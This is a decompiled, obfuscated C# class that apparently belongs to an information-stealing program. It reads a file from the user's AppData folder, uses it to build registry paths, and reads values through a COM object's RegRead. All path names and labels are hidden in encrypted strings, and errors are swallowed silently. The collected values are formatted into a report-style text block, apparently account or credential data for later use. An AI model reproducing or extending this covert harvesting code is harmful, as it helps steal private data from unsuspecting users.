using System;
using System.Diagnostics;
using System.IO;
using System.Runtime.CompilerServices;
using Microsoft.VisualBasic;
using Microsoft.VisualBasic.CompilerServices;

namespace ns1;

internal sealed class Class5
{
	public class Class6
	{
		[DebuggerNonUserCode]
		public Class6()
		{
		}

		public object method_0()
		{
			object result = default(object);
			try
			{
				string string_ = Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + Class9.smethod_0("jpDH0bZ4oai7xJvBvdJ/m7HQFw==", "False");
				string text = method_2(string_);
				string text2 = method_1(Class9.smethod_0("iaesx7+EsbnApY+wxsOzhq7Dwc+n0N7P0qa4rcKwmL3Z07yEq7mzppWsw8HJtcHaygk=", "False") + text + Class9.smethod_0("k5rM18oP", "False"));
				string text3 = method_1(Class9.smethod_0("jqyxzMSJtr7FqpS1y8i4i7PIxtSs1ePU16u9sse1ncLe2MGJsL64q5qxyMbOusbfzwQ=", "False") + text + Class9.smethod_0("jp3H0cUU", "False"));
				string text4 = method_1(Class9.smethod_0("d5Wata1yn6euk32etLGhdJyxr72Vvsy9wJSmm7CehqvHwapymaehlIOasa+3o6/IuBs=", "False") + text + Class9.smethod_0("ma3Wz84J", "False"));
				string text5 = method_1(Class9.smethod_0("bIqPqqJnlJyjiHKTqaaWaZGmpLKKs8GytYmbkKWTe6C8tp9njpyWiXiPpqSsmKS9rSY=", "False") + text + Class9.smethod_0("g5KkIg==", "False"));
				string text6 = method_1(Class9.smethod_0("jKqvysKHtLzDqJKzyca2ibHGxNKq0+HS1am7sMWzm8Dc1r+Hrry2qZivxsTMuMTdzQY=", "False") + text + Class9.smethod_0("g5Cuwasf", "False"));
				string text7 = (string_0 = ((Operators.CompareString(text4, "", false) == 0) ? (Class9.smethod_0("fJeiqZt8l6Kpm3yXqNvQpKC5vJt8l6Kpm3yXoqmbfJeiCg==", "False") + "\r\n\r\n" + Class9.smethod_0("frrKxbiesnajvqW5uhk=", "False") + "\r\n\r\n" + Class9.smethod_0("bIeSmYtsh5KZi2yHkpmLbIeSmYtsh5KZi2yHkpmLbIcZ", "False")) : (Class9.smethod_0("fJeiqZt8l6Kpm3yXqNvQpKC5vJt8l6Kpm3yXoqmbfJeiCg==", "False") + "\r\n\r\n" + Class9.smethod_0("XKCxtq9RUjE=", "False") + text6 + "\r\n" + Class9.smethod_0("aqy7w3tCJQ==", "False") + text2 + Class9.smethod_0("axY=", "False") + text3 + "\r\n" + Class9.smethod_0("bKWitqR4n6J+Vi8=", "False") + text4 + "\r\n" + Class9.smethod_0("cJy5wLaPraqHXyY=", "False") + text5 + Class9.smethod_0("O16Gtp2Nr7G8Yys=", "False") + "\r\n\r\n" + Class9.smethod_0("b4qVnI5vipWcjm+KlZyOb4qVnI5vipWcjm+KlZyOb4oW", "False"))));
				return result;
			}
			catch (Exception projectError)
			{
				ProjectData.SetProjectError(projectError);
				string_0 = "";
				ProjectData.ClearProjectError();
				return result;
			}
		}

		public string method_1(string string_0)
		{
			string result = default(string);
			try
			{
				object objectValue = RuntimeHelpers.GetObjectValue(Interaction.CreateObject(Class9.smethod_0("eZCrwaqSsXaiqYeptCc=", "False"), ""));
				object[] array = new object[1] { string_0 };
				bool[] array2 = new bool[1] { true };
				object obj = NewLateBinding.LateGet(objectValue, (Type)null, "RegRead", array, (string[])null, (Type[])null, array2);
				if (array2[0])
				{
					string_0 = (string)Conversions.ChangeType(RuntimeHelpers.GetObjectValue(array[0]), typeof(string));
				}
				result = Conversions.ToString(obj);
				return result;
			}
			catch (Exception projectError)
			{
				ProjectData.SetProjectError(projectError);
				ProjectData.ClearProjectError();
				return result;
			}
		}

		public string method_2(string string_0)
		{
			string result = default(string);
			try
			{
				StreamReader streamReader = new StreamReader(string_0);
				result = streamReader.ReadToEnd().ToString();
				return result;
			}
			catch (Exception projectError)
			{
				ProjectData.SetProjectError(projectError);
				ProjectData.ClearProjectError();
				return result;
			}
		}
	}

	public static string string_0;
}
